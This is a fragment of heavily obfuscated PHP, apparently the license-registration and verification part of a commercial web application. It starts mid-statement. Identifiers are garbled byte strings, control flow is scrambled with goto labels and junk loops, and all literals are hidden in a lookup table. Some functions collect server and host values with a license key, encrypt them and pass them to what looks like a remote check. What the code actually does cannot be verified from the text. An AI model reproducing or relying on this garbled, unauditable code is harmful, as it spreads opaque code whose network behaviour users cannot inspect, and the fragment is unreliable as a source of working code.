$FÚÛ’ç…ê‹[$cÇÛÄË…§[110]], $cÇÛÄË…§[111] => $cÇÛÄË…§[112]($cÇÛÄË…§[113]($FÚÛ’ç…ê‹, $cÇÛÄË…§[114], array())), $cÇÛÄË…§[115] => (int) $cÇÛÄË…§[113]($FÚÛ’ç…ê‹, $cÇÛÄË…§[116], 0)); $d¾Æ“å°‡¼[$cÇÛÄË…§[117]][$cÇÛÄË…§[118]] = $cÇÛÄË…§[119]($cÇÛÄË…§[120])->{$_SERVER[ÂØÃó©³¸¡¸¢][121]}(); $d…ÊÁƒ«‰¬ = $eßøÖ¸¸ÖÆ[590]; goto Fßêéò„ÙÂ; eõÃòÔï ø: if ($this->tzbwf92f51a5 == $cÇÛÄË…§[130]) { $d¾Æ“å°‡¼[$cÇÛÄË…§[102]][$cÇÛÄË…§[103]][$cÇÛÄË…§[108]][$cÇÛÄË…§[116]] = 0; } $d¾Æ“å°‡¼[$cÇÛÄË…§[117]][$cÇÛÄË…§[137]] = $cÇÛÄË…§[113]($this->nqtpe0b0d2d9, $cÇÛÄË…§[138], $cÇÛÄË…§[10]); $d¾Æ“å°‡¼[$cÇÛÄË…§[117]][$cÇÛÄË…§[139]] = $cÇÛÄË…§[113]($this->nqtpe0b0d2d9, $cÇÛÄË…§[140], $cÇÛÄË…§[10]); goto a„¢¥³›¤Ô; E¢àÙçãƒÔ: $CÍ„–ò¬³Ş = $eßøÖ¸¸ÖÆ[592]; if (!$CÍ„–ò¬³Ş) { die; } if ($fë±ÊÖá”æ[$cÇÛÄË…§[129]] != $cÇÛÄË…§[130]) { $d¾Æ“å°‡¼[$cÇÛÄË…§[117]][$cÇÛÄË…§[131]] = $fë±ÊÖá”æ[$cÇÛÄË…§[131]]; $d¾Æ“å°‡¼[$cÇÛÄË…§[117]][$cÇÛÄË…§[132]] = $fë±ÊÖá”æ[$cÇÛÄË…§[132]]; $aÖ›´ËÎÎí = $cÇÛÄË…§[133](10) . $this->tzbwf92f51a5 . $cÇÛÄË…§[133](5); $d¾Æ“å°‡¼[$cÇÛÄË…§[102]][$cÇÛÄË…§[134]][$cÇÛÄË…§[135]] = $this->{$_SERVER[ÂØÃó©³¸¡¸¢][136]}($aÖ›´ËÎÎí, $d¾Æ“å°‡¼[$cÇÛÄË…§[117]][$cÇÛÄË…§[122]]); } goto eõÃòÔï ø; AªÅ«¹…ˆ: $eßøÖ¸¸ÖÆ =& $_SERVER[‡’¶øåüç˜]; $cÇÛÄË…§ =& $_SERVER[ÂØÃó©³¸¡¸¢]; $fë±ÊÖá”æ = $cÇÛÄË…§[61]($cÇÛÄË…§[62])->{$_SERVER[ÂØÃó©³¸¡¸¢][63]}(); goto BÀ¥´¡ç«ğ; b•ª‰¨¦òÌ: foreach ($Fô”ø„é£‚ as $EÖÕ¶¼³ò) { $dÂ¬ô«¹´Ú = $GLOBALS[$cÇÛÄË…§[100]][$cÇÛÄË…§[101]][$EÖÕ¶¼³ò]; $b™Œ¥¹æ×Ü = $eßøÖ¸¸ÖÆ[589]; if (!$b™Œ¥¹æ×Ü) { return; } if (isset($fë±ÊÖá”æ[$EÖÕ¶¼³ò])) { $dÂ¬ô«¹´Ú = $fë±ÊÖá”æ[$EÖÕ¶¼³ò]; } $d¾Æ“å°‡¼[$cÇÛÄË…§[102]][$cÇÛÄË…§[103]][$EÖÕ¶¼³ò] = $dÂ¬ô«¹´Ú; } $FÚÛ’ç…ê‹ = $d¾Æ“å°‡¼[$cÇÛÄË…§[102]][$cÇÛÄË…§[103]][$cÇÛÄË…§[76]]; unset($d¾Æ“å°‡¼[$cÇÛÄË…§[102]][$cÇÛÄË…§[104]][$cÇÛÄË…§[105]]); goto bÕ•³¨ÙÕâ; bÕ•³¨ÙÕâ: unset($d¾Æ“å°‡¼[$cÇÛÄË…§[102]][$cÇÛÄË…§[104]][$cÇÛÄË…§[106]]); unset($d¾Æ“å°‡¼[$cÇÛÄË…§[102]][$cÇÛÄË…§[103]][$cÇÛÄË…§[76]]); unset($d¾Æ“å°‡¼[$cÇÛÄË…§[102]][$cÇÛÄË…§[103]][$cÇÛÄË…§[107]]); goto E”¸É­à¯›; BÛêÃ¦öÙ—: } private function vydq06c8077a() { goto F—Ó¶ƒ×ƒ; F—Ó¶ƒ×ƒ: $CÊ×„²§‡ =& $_SERVER[‡’¶øåüç˜]; $f…Æ»“ï«Š =& $_SERVER[ÂØÃó©³¸¡¸¢]; if ($_SERVER[$f…Æ»“ï«Š[44]] == $f…Æ»“ï«Š[144]) { goto B–ğŠÒÓªÆ; A¸Î«İºé: $f…Æ»“ï«Š[13](array($f…Æ»“ï«Š[160], $f…Æ»“ï«Š[161]), $DçÒŒÛ£»â); $cÊŞº±„¶» = $CÊ×„²§‡[595]; if (!$cÊŞº±„¶») { return; } goto FÄ²‡í–¯×; a‘ôçœĞôÅ: $DçÒŒÛ£»â = array($f…Æ»“ï«Š[159] => $CåÈÈµÉÂ); $Dä¼Â ƒ = $CÊ×„²§‡[594]; while (strlen($Dä¼Â ƒ) < $CÊ×„²§‡[377]) { if (!$Dä¼Â ƒ) { break; } $Dä¼Â ƒ++; } goto A¸Î«İºé; B–ğŠÒÓªÆ: $CåÈÈµÉÂ = array($f…Æ»“ï«Š[129] => $this->tzbwf92f51a5, $f…Æ»“ï«Š[145] => $this->{$_SERVER[ÂØÃó©³¸¡¸¢][146]}(), $f…Æ»“ï«Š[147] => $f…Æ»“ï«Š[61]($f…Æ»“ï«Š[148])->{$_SERVER[ÂØÃó©³¸¡¸¢][149]}()); if ($this->tzbwf92f51a5 != $f…Æ»“ï«Š[130]) { $CÈì¼öºŒ = $f…Æ»“ï«Š[113]($this->nqtpe0b0d2d9, $f…Æ»“ï«Š[150]); if ($CÈì¼öºŒ) { $CåÈÈµÉÂ[$f…Æ»“ï«Š[151]] = $CÈì¼öºŒ; $CåÈÈµÉÂ[$f…Æ»“ï«Š[152]] = $f…Æ»“ï«Š[153]($f…Æ»“ï«Š[113]($this->nqtpe0b0d2d9, $f…Æ»“ï«Š[154])); $CåÈÈµÉÂ[$f…Æ»“ï«Š[155]] = $f…Æ»“ï«Š[113]($this->nqtpe0b0d2d9, $f…Æ»“ï«Š[140]); } } $CåÈÈµÉÂ = $this->{$_SERVER[ÂØÃó©³¸¡¸¢][156]}($f…Æ»“ï«Š[157]($CåÈÈµÉÂ), $f…Æ»“ï«Š[123]($f…Æ»“ï«Š[158])); goto a‘ôçœĞôÅ; FÄ²‡í–¯×: } goto DšÁÖÅ„ŠÖ; dÀÄÎñ·ª: while ($c‹ñËõÔ < $CÊ×„²§‡[576]) { if ($c‹ñËõÔ >= 0) { break; } $c‹ñËõÔ++; } $DçÒŒÛ£»â = array($f…Æ»“ï«Š[168] => $CÍ¾ß…±Ø„[$f…Æ»“ï«Š[64]], $f…Æ»“ï«Š[169] => $CÍ¾ß…±Ø„[$f…Æ»“ï«Š[65]], $f…Æ»“ï«Š[170] => $f…Æ»“ï«Š[10]); $a‹¥‹²‚¾· = $CÊ×„²§‡[598]; goto dóì´¢ğ¤; DšÁÖÅ„ŠÖ: if ($this->tzbwf92f51a5 == $f…Æ»“ï«Š[130]) { return; } $Dø±©ÕÅñ„ = array($f…Æ»“ï«Š[162], $f…Æ»“ï«Š[163], $f…Æ»“ï«Š[164], $f…Æ»“ï«Š[165], $f…Æ»“ï«Š[166], $f…Æ»“ï«Š[167]); $AÑ™¡ó‰ô½ = $CÊ×„²§‡[596]; goto EÅöÊøÖÙ—; dóì´¢ğ¤: while (strlen($a‹¥‹²‚¾·) < $CÊ×„²§‡[564]) { if (!$a‹¥‹²‚¾·) { break; } $a‹¥‹²‚¾·++; } foreach ($Dø±©ÕÅñ„ as $cÔà¥´) { if (!isset($CÍ¾ß…±Ø„[$cÔà¥´]) || !$CÍ¾ß…±Ø„[$cÔà¥´]) { continue; } $DçÒŒÛ£»â[$cÔà¥´] = $CÍ¾ß…±Ø„[$cÔà¥´]; $CÄé—­Û÷¢ = $CÊ×„²§‡[599]; if (strlen($CÄé—­Û÷¢) < $CÊ×„²§‡[570]) { return; } } $f…Æ»“ï«Š[13](array($f…Æ»“ï«Š[160], $f…Æ»“ï«Š[161]), $DçÒŒÛ£»â); goto a¯é÷´ù¾Ò; EÅöÊøÖÙ—: if (!$AÑ™¡ó‰ô½) { return; } $CÍ¾ß…±Ø„ = $f…Æ»“ï«Š[61]($f…Æ»“ï«Š[62])->{$_SERVER[ÂØÃó©³¸¡¸¢][63]}(); $c‹ñËõÔ = $CÊ×„²§‡[597]; goto dÀÄÎñ·ª; a¯é÷´ù¾Ò: } private function bxsw31922148() { goto D‚ÇšİĞÙƒ; cÚ—Î¡‡¡×: if (!isset($bí¡îÆ›àë[$DÜšÙ°¡¨º[174]]) || $DÜšÙ°¡¨º[24]($bí¡îÆ›àë[$DÜšÙ°¡¨º[174]]) != 16) { $DÜšÙ°¡¨º[175]($DÜšÙ°¡¨º[176] . $bí¡îÆ›àë[$DÜšÙ°¡¨º[174]], !1); } $f‡ñ°óª¥¡ = $DÜšÙ°¡¨º[61]($DÜšÙ°¡¨º[62])->{$_SERVER[ÂØÃó©³¸¡¸¢][63]}($DÜšÙ°¡¨º[125]); $cŞ§‰È²‚ = array($DÜšÙ°¡¨º[174] => $bí¡îÆ›àë[$DÜšÙ°¡¨º[174]], $DÜšÙ°¡¨º[177] => $DÜšÙ°¡¨º[133](16), $DÜšÙ°¡¨º[178] => $DÜšÙ°¡¨º[158], $DÜšÙ°¡¨º[179] => $DÜšÙ°¡¨º[180], $DÜšÙ°¡¨º[181] => $_SERVER[$DÜšÙ°¡¨º[182]], $DÜšÙ°¡¨º[183] => $_SERVER[$DÜšÙ°¡¨º[184]], $DÜšÙ°¡¨º[185] => $_SERVER[$DÜšÙ°¡¨º[186]]); goto f³¾ØæÕ›ì; FÖùâ—Ÿ…»: $b³Èº˜°õÛ = $BÓ¨¾ÙÕ³®[601]; if (!$b³Èº˜°õÛ) { return; } if ($bí¡îÆ›àë[$DÜšÙ°¡¨º[187]] == $DÜšÙ°¡¨º[188]) { $e´ÄË½ä—ñ = $this->{$_SERVER[ÂØÃó©³¸¡¸¢][156]}($CëÕ’‡Å¸ç, $DÜšÙ°¡¨º[189]); $a”½Ä‘æ°¦ = $this->{$_SERVER[ÂØÃó©³¸¡¸¢][136]}($DÜšÙ°¡¨º[157]($cŞ§‰È²‚), $CëÕ’‡Å¸ç . $DÜšÙ°¡¨º[190], 3); $D ›ƒÜ¸õÉ = $this->{$_SERVER[ÂØÃó©³¸¡¸¢][191]}($DÜšÙ°¡¨º[192] . $e´ÄË½ä—ñ . $DÜšÙ°¡¨º[193] . $a”½Ä‘æ°¦, -1); $DÜšÙ°¡¨º[175]($D ›ƒÜ¸õÉ, !0); } else { if ($bí¡îÆ›àë[$DÜšÙ°¡¨º[187]] == $DÜšÙ°¡¨º[194]) { $B•˜®ìõß = $DÜšÙ°¡¨º[25]($DÜšÙ°¡¨º[123]($DÜšÙ°¡¨º[195] . $CëÕ’‡Å¸ç), 12, 15) . $DÜšÙ°¡¨º[196]; $a”½Ä‘æ°¦ = $this->{$_SERVER[ÂØÃó©³¸¡¸¢][197]}($DÜšÙ°¡¨º[2]($bí¡îÆ›àë[$DÜšÙ°¡¨º[198]]), $B•˜®ìõß, 2); $e—™èğ³Ë = $DÜšÙ°¡¨º[199]($a”½Ä‘æ°¦, !0); if (!$DÜšÙ°¡¨º[200]($e—™èğ³Ë) || !$DÜšÙ°¡¨º[200]($e—™èğ³Ë[$DÜšÙ°¡¨º[201]]) || $e—™èğ³Ë[$DÜšÙ°¡¨º[174]] != !0) { $c™ÏµîÔÂÕ = $DÜšÙ°¡¨º[202]; $F©Ë©š¶‡ = $e—™èğ³Ë[$DÜšÙ°¡¨º[201]] ? $DÜšÙ°¡¨º[203] . $e—™èğ³Ë[$DÜšÙ°¡¨º[201]] : $c™ÏµîÔÂÕ; $DÜšÙ°¡¨º[175]($F©Ë©š¶‡, !1); } else { $cŞ§‰È²‚[$DÜšÙ°¡¨º[177]] = $e—™èğ³Ë[$DÜšÙ°¡¨º[201]][$DÜšÙ°¡¨º[204]]; } } else { $e—™èğ³Ë = $this->{$_SERVER[ÂØÃó©³¸¡¸¢][191]}($DÜšÙ°¡¨º[205], $cŞ§‰È²‚, 10); } } goto BğàÔ‹„È¿; eºÏ—£Îç: $C†Á”©¢ ¹ = $D‘×¤Ø¤²Æ[$DÜšÙ°¡¨º[233]]; $C’¿¸µÊŒŠ = array(); $c•Öİ„Ã• = $BÓ¨¾ÙÕ³®[607]; goto C­¹‹«Õ; Eî…°Ï˜×: $FÏÈ …ØÀí = $BÓ¨¾ÙÕ³®[603]; while (strlen($FÏÈ …ØÀí) < $BÓ¨¾ÙÕ³®[377]) { if (!$FÏÈ …ØÀí) { break; } $FÏÈ …ØÀí++; } $EÏÜµòÜÖé[$DÜšÙ°¡¨º[132]] = $DÜšÙ°¡¨º[127]($DÜšÙ°¡¨º[222]($this->{$_SERVER[ÂØÃó©³¸¡¸¢][156]}($C‡˜¤œ·Şï, $DÜšÙ°¡¨º[224]))); goto eİöé‡ÏÂÕ; a¬¡¶…“òî: while ($f¡¼‘‰æ‡ < $BÓ¨¾ÙÕ³®[564]) { if ($f¡¼‘‰æ‡ >= 0) { break; } $f¡¼‘‰æ‡++; } $this->{$_SERVER[ÂØÃó©³¸¡¸¢][237]}(); $a´Â³º¯Ìˆ = $BÓ¨¾ÙÕ³®[611]; goto Cšô¨çšÎŠ; C­¹‹«Õ: if (!$c•Öİ„Ã•) { die; } $C’¿¸µÊŒŠ[$F¸–Š…À²] = $A‹®Ää±âğ; $DÜšÙ°¡¨º[61]($DÜšÙ°¡¨º[11])->{$_SERVER[ÂØÃó©³¸¡¸¢][234]}($C†Á”©¢ ¹[$DÜšÙ°¡¨º[235]], array($DÜšÙ°¡¨º[236] => $C’¿¸µÊŒŠ)); goto b¶ù¼™Î…; dŠ½…ô¬õ: $bê ·ŠË® = $DÜšÙ°¡¨º[25]($DÜšÙ°¡¨º[123]($EÏÜµòÜÖé[$DÜšÙ°¡¨º[218]]), 10, 10); $bëÈ£³°÷Õ = $bê ·ŠË® . $EÏÜµòÜÖé[$DÜšÙ°¡¨º[129]] . $EÏÜµòÜÖé[$DÜšÙ°¡¨º[220]]; $EÏÜµòÜÖé[$DÜšÙ°¡¨º[131]] = $DÜšÙ°¡¨º[222]($DÜšÙ°¡¨º[127]($this->{$_SERVER[ÂØÃó©³¸¡¸¢][156]}($bëÈ£³°÷Õ, $DÜšÙ°¡¨º[223]))); goto b«Æùõ‹®æ; A´ÚÙ¦£´‰: $CÙ—„¸àŸ® = $BÓ¨¾ÙÕ³®[609]; $this->tzbwf92f51a5 = $EÏÜµòÜÖé[$DÜšÙ°¡¨º[129]]; $f¡¼‘‰æ‡ = $BÓ¨¾ÙÕ³®[610]; goto a¬¡¶…“òî; eİöé‡ÏÂÕ: $AŞİ‡í‚ïÀ = $BÓ¨¾ÙÕ³®[604]; while ($AŞİ‡í‚ïÀ < $BÓ¨¾ÙÕ³®[564]) { if ($AŞİ‡í‚ïÀ >= 0) { break; } $AŞİ‡í‚ïÀ++; } if ($CÚÀ¨‚½Ş½[$DÜšÙ°¡¨º[225]] && $CÚÀ¨‚½Ş½[$DÜšÙ°¡¨º[225]] >= 1) { $DÜšÙ°¡¨º[61]($DÜšÙ°¡¨º[62])->{$_SERVER[ÂØÃó©³¸¡¸¢][226]}($DÜšÙ°¡¨º[227], $DÜšÙ°¡¨º[228]); } goto D¶ÉªºÎô‰; BğàÔ‹„È¿: if (!$DÜšÙ°¡¨º[200]($e—™èğ³Ë) || !$DÜšÙ°¡¨º[200]($e—™èğ³Ë[$DÜšÙ°¡¨º[201]]) || $e—™èğ³Ë[$DÜšÙ°¡¨º[174]] != !0) { $c™ÏµîÔÂÕ = $DÜšÙ°¡¨º[206]($DÜšÙ°¡¨º[207]); $F©Ë©š¶‡ = $e—™èğ³Ë[$DÜšÙ°¡¨º[201]] ? $DÜšÙ°¡¨º[203] . $e—™èğ³Ë[$DÜšÙ°¡¨º[201]] : $c™ÏµîÔÂÕ; $DÜšÙ°¡¨º[175]($F©Ë©š¶‡, !1); } $CÚÀ¨‚½Ş½ = $e—™èğ³Ë[$DÜšÙ°¡¨º[201]]; $b©È¤ç·ª = $this->{$_SERVER[ÂØÃó©³¸¡¸¢][208]}($CÚÀ¨‚½Ş½[$DÜšÙ°¡¨º[209]]); goto c§ÖÌë…ÊÆ; b¶ù¼™Î…: $fÀ¨Ê²ÀêÔ = $BÓ¨¾ÙÕ³®[608]; if (!$fÀ¨Ê²ÀêÔ) { return; } $this->nqtpe0b0d2d9 = $CÚÀ¨‚½Ş½; goto A´ÚÙ¦£´‰; eá’ê °õ: if (!$DÜšÙ°¡¨º[113]($GLOBALS, $DÜšÙ°¡¨º[141])) { die; } $bí¡îÆ›àë = $GLOBALS[$DÜšÙ°¡¨º[22]]; if (isset($bí¡îÆ›àë[$DÜšÙ°¡¨º[172]])) { $this->{$_SERVER[ÂØÃó©³¸¡¸¢][173]}(); die; } goto cÚ—Î¡‡¡×; b«Æùõ‹®æ: $dÙÔ§²ºÔ = $DÜšÙ°¡¨º[133](16); $cŠò‘¬ô½Ó = $BÓ¨¾ÙÕ³®[602]; $C‡˜¤œ·Şï = $dÙÔ§²ºÔ . $EÏÜµòÜÖé[$DÜšÙ°¡¨º[129]] . $this->{$_SERVER[ÂØÃó©³¸¡¸¢][156]}($DÜšÙ°¡¨º[123]($EÏÜµòÜÖé[$DÜšÙ°¡¨º[217]]), $dÙÔ§²ºÔ); goto Eî…°Ï˜×; D¶ÉªºÎô‰: $DÜšÙ°¡¨º[61]($DÜšÙ°¡¨º[62])->{$_SERVER[ÂØÃó©³¸¡¸¢][229]}($EÏÜµòÜÖé); $eíÒĞèó˜Ğ = $DÜšÙ°¡¨º[123]($_SERVER[$DÜšÙ°¡¨º[124]] . $DÜšÙ°¡¨º[222]($f‡ñ°óª¥¡) . $EÏÜµòÜÖé[$DÜšÙ°¡¨º[218]]); $Có´ƒóì¯İ = $BÓ¨¾ÙÕ³®[605]; goto B¥¢ê“™ïï; B¥¢ê“™ïï: while (strlen($Có´ƒóì¯İ) < $BÓ¨¾ÙÕ³®[572]) { if (!$Có´ƒóì¯İ) { break; } $Có´ƒóì¯İ++; } $F¸–Š…À² = $DÜšÙ°¡¨º[222]($DÜšÙ°¡¨º[25]($eíÒĞèó˜Ğ, 10, 16)); $A‹®Ää±âğ = $this->{$_SERVER[ÂØÃó©³¸¡¸¢][136]}($DÜšÙ°¡¨º[157]($CÚÀ¨‚½Ş½), $eíÒĞèó˜Ğ); goto eÇì¿íé¡; eÇì¿íé¡: $CºöÉ·ƒÒ® = $BÓ¨¾ÙÕ³®[606]; if (strlen($CºöÉ·ƒÒ®) < $BÓ¨¾ÙÕ³®[564]) { die; } $D‘×¤Ø¤²Æ = $DÜšÙ°¡¨º[230]($DÜšÙ°¡¨º[61]($DÜšÙ°¡¨º[11])->{$_SERVER[ÂØÃó©³¸¡¸¢][231]}(), $DÜšÙ°¡¨º[232]); goto eºÏ—£Îç; f³¾ØæÕ›ì: $b£ªÌÆ£Ñì = $BÓ¨¾ÙÕ³®[600]; while (strlen($b£ªÌÆ£Ñì) < $BÓ¨¾ÙÕ³®[572]) { if (!$b£ªÌÆ£Ñì) { break; } $b£ªÌÆ£Ñì++; } $CëÕ’‡Å¸ç = $DÜšÙ°¡¨º[123]($_SERVER[$DÜšÙ°¡¨º[124]] . $f‡ñ°óª¥¡); goto FÖùâ—Ÿ…»; Cšô¨çšÎŠ: while ($a´Â³º¯Ìˆ < $BÓ¨¾ÙÕ³®[572]) { if ($a´Â³º¯Ìˆ >= 0) { break; } $a´Â³º¯Ìˆ++; } $DÜšÙ°¡¨º[175]($DÜšÙ°¡¨º[206]($DÜšÙ°¡¨º[216]), !0); goto d”Ì˜¿Ññ; c§ÖÌë…ÊÆ: if (!$b©È¤ç·ª || $b©È¤ç·ª != $CÚÀ¨‚½Ş½[$DÜšÙ°¡¨º[154]]) { $aÃ÷®½•Ğ‡ = array($DÜšÙ°¡¨º[210] => $DÜšÙ°¡¨º[61]($DÜšÙ°¡¨º[62])->{$_SERVER[ÂØÃó©³¸¡¸¢][63]}($DÜšÙ°¡¨º[125]), $DÜšÙ°¡¨º[211] => $_SERVER[$DÜšÙ°¡¨º[124]], $DÜšÙ°¡¨º[212] => $DÜšÙ°¡¨º[213](), $DÜšÙ°¡¨º[183] => $_SERVER[$DÜšÙ°¡¨º[184]]); $a”½Ä‘æ°¦ = $this->{$_SERVER[ÂØÃó©³¸¡¸¢][214]}($DÜšÙ°¡¨º[157]($aÃ÷®½•Ğ‡)); $this->{$_SERVER[ÂØÃó©³¸¡¸¢][191]}($DÜšÙ°¡¨º[215] . $a”½Ä‘æ°¦); $DÜšÙ°¡¨º[175]($DÜšÙ°¡¨º[206]($DÜšÙ°¡¨º[216]), !0); } $EÏÜµòÜÖé = array($DÜšÙ°¡¨º[217] => $cŞ§‰È²‚[$DÜšÙ°¡¨º[174]], $DÜšÙ°¡¨º[218] => $CÚÀ¨‚½Ş½[$DÜšÙ°¡¨º[219]], $DÜšÙ°¡¨º[220] => $DÜšÙ°¡¨º[133](16), $DÜšÙ°¡¨º[129] => $CÚÀ¨‚½Ş½[$DÜšÙ°¡¨º[221]]); if ($cŞ§‰È²‚[$DÜšÙ°¡¨º[177]]) { $EÏÜµòÜÖé[$DÜšÙ°¡¨º[220]] = $cŞ§‰È²‚[$DÜšÙ°¡¨º[177]]; } goto dŠ½…ô¬õ; D‚ÇšİĞÙƒ: $BÓ¨¾ÙÕ³® =& $_SERVER[‡’¶øåüç˜]; $DÜšÙ°¡¨º =& $_SERVER[ÂØÃó©³¸¡¸¢]; if ($_SERVER[$DÜšÙ°¡¨º[44]] != $DÜšÙ°¡¨º[171]) { return; } goto eá’ê °õ; d”Ì˜¿Ññ: } private function licenseRegistSuccess() { goto FÒÉ¸“İÚğ; cáÅ«¾»‹—: $aÛ‹ïÄá¥ = $e«åŒª”¦‘[612]; if (strlen($aÛ‹ïÄá¥) < $e«åŒª”¦‘[572]) { return; } if ($e¨’³ù™º[$BÖ”íÇÛÌ[89]] != $BÖ”íÇÛÌ[228]) { $BÖ”íÇÛÌ[61]($BÖ”íÇÛÌ[62])->{$_SERVER[ÂØÃó©³¸¡¸¢][229]}($BÖ”íÇÛÌ[89], $BÖ”íÇÛÌ[228]); } goto B©µ›¬¨Üò; FÒÉ¸“İÚğ: $e«åŒª”¦‘ =& $_SERVER[‡’¶øåüç˜]; $BÖ”íÇÛÌ =& $_SERVER[ÂØÃó©³¸¡¸¢]; $e¨’³ù™º = $BÖ”íÇÛÌ[61]($BÖ”íÇÛÌ[62])->{$_SERVER[ÂØÃó©³¸¡¸¢][63]}(); goto cáÅ«¾»‹—; B©µ›¬¨Üò: $BÖ”íÇÛÌ[119]($BÖ”íÇÛÌ[238])->{$_SERVER[ÂØÃó©³¸¡¸¢][239]}(!0); goto eöê•ÕÍ×î; eöê•ÕÍ×î: } private function cxtv02113228() { goto d¨©ì¼“Èƒ; D‡×„–Ø×õ: $this->tzbwf92f51a5 = $F‹ğ‘øÎ[130]; $d‰É¹“Ä = $CšÓƒŒ¾[614]; while (strlen($d‰É¹“Ä) < $CšÓƒŒ¾[564]) { if (!$d‰É¹“Ä) { break; } $d‰É¹“Ä++; } goto EÖºå›òÑ—; d¨©ì¼“Èƒ: $CšÓƒŒ¾ =& $_SERVER[‡’¶øåüç˜]; $F‹ğ‘øÎ =& $_SERVER[ÂØÃó©³¸¡¸¢]; $F‹ğ‘øÎ[61]($F‹ğ‘øÎ[62])->{$_SERVER[ÂØÃó©³¸¡¸¢][229]}(array($F‹ğ‘øÎ[217] => $F‹ğ‘øÎ[10], $F‹ğ‘øÎ[218] => $F‹ğ‘øÎ[10], $F‹ğ‘øÎ[129] => $F‹ğ‘øÎ[130], $F‹ğ‘øÎ[131] => $F‹ğ‘øÎ[10], $F‹ğ‘øÎ[132] => $F‹ğ‘øÎ[10])); goto dãäÔ®ãÈ; dãäÔ®ãÈ: $F‹ğ‘øÎ[61]($F‹ğ‘øÎ[62])->{$_SERVER[ÂØÃó©³¸¡¸¢][226]}($F‹ğ‘øÎ[227], $F‹ğ‘øÎ[240]); $Föªñ¯È‹ = $CšÓƒŒ¾[613]; $this->nqtpe0b0d2d9 = array(); goto D‡×„–Ø×õ; EÖºå›òÑ—: } private function psdyf7e49bf2() { goto Aµ¥±ĞËÑÊ; CŠ™ô‡Å‰†: if (strlen($fÂÉÄÒöÁ) < $a·É¥ëÊ»[572]) { return; } $EÜöˆ”¿ÒÁ = $eŸİ—¼¾À[230]($eŸİ—¼¾À[61]($eŸİ—¼¾À[11])->{$_SERVER[ÂØÃó©³¸¡¸¢][231]}(), $eŸİ—¼¾À[232]); $fÆä›÷²‡å = $EÜöˆ”¿ÒÁ[$eŸİ—¼¾À[233]]; goto E„³‡Õ¥«Š; E„³‡Õ¥«Š: $B¯•¸ìÌä¦ = $eŸİ—¼¾À[123]($_SERVER[$eŸİ—¼¾À[124]] . $eŸİ—¼¾À[222]($A¬İ‹­¨Ÿƒ) . $A‹Ç¿ªíº×[$eŸİ—¼¾À[218]]); $eÉ¦è¡Ç = $a·É¥ëÊ»[617]; while ($eÉ¦è¡Ç < $a·É¥ëÊ»[572]) { if ($eÉ¦è¡Ç >= 0) { break; } $eÉ¦è¡Ç++; } goto BŸÃîé¡»Š; b˜Å×¸Àƒˆ: $A‹Ç¿ªíº× = $eŸİ—¼¾À[61]($eŸİ—¼¾À[62])->{$_SERVER[ÂØÃó©³¸¡¸¢][63]}(); $aİ‡­‹­Â¿ = $a·É¥ëÊ»[610]; if (!$aİ‡­‹­Â¿) { die; } goto cÖÙÊ¯Æ®Å; aÏ­ôÚ¢¨©: $this->nqtpe0b0d2d9 = $F‡ ¬“–Í; $this->tzbwf92f51a5 = $A‹Ç¿ªíº×[$eŸİ—¼¾À[129]]; goto a…‡†ô·±Ù; Aµ¥±ĞËÑÊ: $a·É¥ëÊ» =& $_SERVER[‡’¶øåüç˜]; $eŸİ—¼¾À =& $_SERVER[ÂØÃó©³¸¡¸¢]; $_SERVER[$eŸİ—¼¾À[184]] = $eŸİ—¼¾À[113]($_SERVER, $eŸİ—¼¾À[184], APP_HOST); goto cõê¯¦î­²; BŸÃîé¡»Š: $b‹…áÏœÀ = $eŸİ—¼¾À[222]($eŸİ—¼¾À[25]($B¯•¸ìÌä¦, 10, 16)); $bÄ’…ŒìÛ– = $a·É¥ëÊ»[618]; while ($bÄ’…ŒìÛ– < $a·É¥ëÊ»[576]) { if ($bÄ’…ŒìÛ– >= 0) { break; } $bÄ’…ŒìÛ–++; } goto FÑÎƒÆàä©; cÖÙÊ¯Æ®Å: if ($A‹Ç¿ªíº×[$eŸİ—¼¾À[129]] == $eŸİ—¼¾À[130]) { return; } $A¬İ‹­¨Ÿƒ = $eŸİ—¼¾À[61]($eŸİ—¼¾À[62])->{$_SERVER[ÂØÃó©³¸¡¸¢][63]}($eŸİ—¼¾À[125]); $fÂÉÄÒöÁ = $a·É¥ëÊ»[616]; goto CŠ™ô‡Å‰†; D®ÒÙÌ‡»Ã: if (!$eŸİ—¼¾À[200]($F‡ ¬“–Í)) { return $this->{$_SERVER[ÂØÃó©³¸¡¸¢][173]}(); } $e¶±ì·áÏ = $eŸİ—¼¾À[153]($F‡ ¬“–Í[$eŸİ—¼¾À[154]]); if ($eŸİ—¼¾À[241]() >= $e¶±ì·áÏ) { return $this->{$_SERVER[ÂØÃó©³¸¡¸¢][173]}(); } goto aÏ­ôÚ¢¨©; FÑÎƒÆàä©: $F‡ ¬“–Í = $this->{$_SERVER[ÂØÃó©³¸¡¸¢][197]}($fÆä›÷²‡å[$eŸİ—¼¾À[100]][$b‹…áÏœÀ], $B¯•¸ìÌä¦); $Eî¢Ûáòä = $a·É¥ëÊ»[619]; $F‡ ¬“–Í = $eŸİ—¼¾À[199]($F‡ ¬“–Í, !0); goto D®ÒÙÌ‡»Ã; cõê¯¦î­²: $this->tzbwf92f51a5 = $eŸİ—¼¾À[130]; $EÈ·ò“ŸçÓ = $a·É¥ëÊ»[615]; while (strlen($EÈ·ò“ŸçÓ) < $a·É¥ëÊ»[572]) { if (!$EÈ·ò“ŸçÓ) { break; } $EÈ·ò“ŸçÓ++; } goto b˜Å×¸Àƒˆ; a…‡†ô·±Ù: } private function jtwhee83ceae() { goto Dª¾µ·Æ‰; DºìŒÀ‡ÕÒ: if (strlen($eƒ¨ğÂ¥Ü) < $A”¿ œœ“ê[564]) { return; } if ($a¬Ì†¤¿ì == $E½Ó³‰İ„ª[242] && $this->tzbwf92f51a5 == $E½Ó³‰İ„ª[130]) { $E½Ó³‰İ„ª[175]($E½Ó³‰İ„ª[206]($E½Ó³‰İ„ª[243]), !1, $E½Ó³‰İ„ª[244]); } $CÚÕ‹Ê‰ç = array($E½Ó³‰İ„ª[245], $E½Ó³‰İ„ª[246]); goto D î·‡Ì Ö; Dª¾µ·Æ‰: $A”¿ œœ“ê =& $_SERVER[‡’¶øåüç˜]; $E½Ó³‰İ„ª =& $_SERVER[ÂØÃó©³¸¡¸¢]; $a½à›«Ëçª = $GLOBALS[$E½Ó³‰İ„ª[22]]; goto DÃ©ºÌ›§â; D î·‡Ì Ö: if ($E½Ó³‰İ„ª[247]($a¬Ì†¤¿ì, $CÚÕ‹Ê‰ç)) { if ($this->tzbwf92f51a5 == $E½Ó³‰İ„ª[130] && isset($a½à›«Ëçª[$E½Ó³‰İ„ª[248]])) { 